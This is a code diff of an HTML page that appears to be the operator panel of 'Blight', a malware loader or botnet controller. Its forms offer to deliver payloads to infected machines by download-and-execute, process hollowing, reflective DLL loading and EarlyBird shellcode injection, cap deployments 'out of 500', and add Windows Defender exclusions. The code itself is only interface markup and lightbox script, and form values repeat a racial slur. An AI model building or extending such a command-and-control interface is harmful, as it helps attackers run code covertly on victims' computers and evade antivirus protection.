@@ -4,12 +4,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blight - Clients</title>
+    <title>Blight - Loader</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
+    <div id="overlay"></div>
     <div class="container">
         <aside class="sidebar">
             <div class="logo">
@@ -48,78 +49,144 @@
             </div>
         </aside>
         <main class="content">
+
             <div class="forms">
-                <div class="form-container">
-                    <h1 class="form-header work-sans-light">Payload Execution</h1>
-                    <p>Disk supported extensions: Any | Memory supported extensions: DLL, EXE, BIN 
-                    </p>
-                    <hr>
-                    <form action="#" method="post">
 
-                        <select name="Execution Type">
-                            <option value="nigga">Download and execute</option>
-                            <option value="nigga">Execute in memory </option>
-                        </select>
+                <button onclick="openLightbox(0)" class="loadCreationButton">
+                    <i class="fa-solid fa-file"></i>
+                    Create Payload Load
+                </button>
 
-                        <textarea id="message" name="message" required></textarea>
-
-                        <input type="submit" value="Submit">
-                    </form>
-                </div>
-                
-                <div class="form-container">
-                    <h1 class="work-sans-light">Plugins</h1>
-                    <p>Plugins loaded in from your plugins folder.</p>
-                    <p></p>
-                    <hr>
-                    <form action="#" method="post">
-                        <label for="name">Command Type</label>
-
-                        <select name="Execution Type">
-                            <option value="nigga">Windows Defender Exclusion</option>
-                        </select>
-
-                        <label for="message">Arguments</label>
-                        <input type="text">
-
-                        <input type="submit" value="Submit">
-                    </form>
-                </div>
-                
-              
+                <button onclick="openLightbox(1)" class="loadCreationButton">
+                    <i class="fa-solid fa-plug"></i>
+                    Create Plugin Load
+                </button>
             </div>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Progress</th>
-                        <th>Recursive</th>
-                        <th>Command Type</th>
-                        <th>Command Arguments</th>
-                        <th>Action</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td>
-                            <div class="progress-container">
-                                <div class="progress-bar" style="width: 50%;"></div>
-                            </div>
-                        </td>
 
-                        <td><i class="fa-solid fa-check"></i></td>
-                        <td>Lua Execution</td>
-                        <td>file:payload.lua</td>
-                        <td>
-                            <button>Delete</button>
-                        </td>
-                    </tr>
-                </tbody>
-            </table>
+            <div id="lightboxesContainer">
+
+                <div class="lightbox">
+                    <div class="forms">
+                        <div class="form-container">
+                            <button class="close-bttn" onclick="closeLightbox()">
+                                <i class="fa-solid fa-angle-down"></i>
+                            </button>
+                            <h1 class="work-sans-light">Payload Execution</h1>
+                            <hr>
+                            <form action="#" method="post">
+                                <label for="name">Execution Type</label>
+                                <select name="Execution Type">
+                                    <option value="nigga">ANY | Download And Execute</option>
+                                    <option value="nigga">.EXE | Update And Remove</option>
+                                    <option value="nigga">.EXE | Update And Keep</option>
+                                    <option value="nigga">.EXE | Proccess Hollowing</option>
+                                    <option value="nigga">.DLL | Reflective DLL</option>
+                                    <option value="nigga">.DLL | Rundll32 From Disk</option>
+                                    <option value="nigga">.BIN | EarlyBird Shellcode</option>
+                                </select>
+                
+                                <label for="message">Amount</label>
+                                <input type="number" placeholder="Out of 500, or blank for no limit">
+        
+                                <label for="message">Payload</label>
+                                <input type="file">
+        
+                                <input id="nigga" type="submit" value="Submit">
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                
+
+
+                <div class="lightbox"  id="secondLightbox">
+                    <div class="forms">
+                        <div class="form-container">
+                            <button class="close-bttn" onclick="closeLightbox()">
+                                <i class="fa-solid fa-angle-down"></i>
+                            </button>
+                            <h1 class="work-sans-light">Plugin Loading</h1>
+                            <hr>
+                            <form action="#" method="post">
+                                <label for="name">Command Type</label>
+                                <select name="Execution Type">
+                                    <option value="nigga">Windows Defender Exclusion</option>
+                                </select>
+        
+                                <label for="message">Description</label>
+                                <textarea class="description_plugins" name="message"
+                                    disabled>Only argument is a folder path. Cannot be a file path.</textarea>
+        
+                                <label for="message">Amount</label>
+                                <input type="number" placeholder="Out of 500, or blank for no limit">
+        
+                                <label for="message">Arguments</label>
+                                <input type="text">
+        
+                                <input id="nigga" type="submit" value="Submit">
+                            </form>
+                        </div>
+                    </div>
+                </div>
+        
+            </div>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Progress</th>
+                            <th>Recursive</th>
+                            <th>Command Type</th>
+                            <th>Command Arguments</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>
+                                <div class="progress-container">
+                                    <div class="progress-bar" style="width: 50%;"></div>
+                                </div>
+                            </td>
+
+                            <td><i class="fa-solid fa-check"></i></td>
+                            <td>Lua Execution</td>
+                            <td>file:payload.lua</td>
+                            <td>
+                                <button class="remove-button "><i class="fa-solid fa-trash"></i> Delete</button>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
 
 
         </main>
 
     </div>
+    <script>
+        var lightboxesContainer = document.getElementById("lightboxesContainer");
+        var lightboxes = Array.from(lightboxesContainer.getElementsByClassName("lightbox"));
+
+        for (let lightbox of lightboxes) {
+            lightbox.style.opacity = "0";
+            lightbox.style.pointerEvents = 'none';
+            document.getElementById("overlay").style.opacity = "0";
+        }
+
+        function openLightbox(index) {
+            lightboxes[index].style.opacity = "1";
+            lightboxes[index].style.pointerEvents = 'auto';
+            document.getElementById("overlay").style.opacity = ".7";
+        }
+
+        function closeLightbox() {
+           for (let lightbox of lightboxes) {
+             lightbox.style.opacity = "0";
+             lightbox.style.pointerEvents = 'none';
+             document.getElementById("overlay").style.opacity = "0";
+           }
+        }
+    </script>
 </body>
 
 </html>
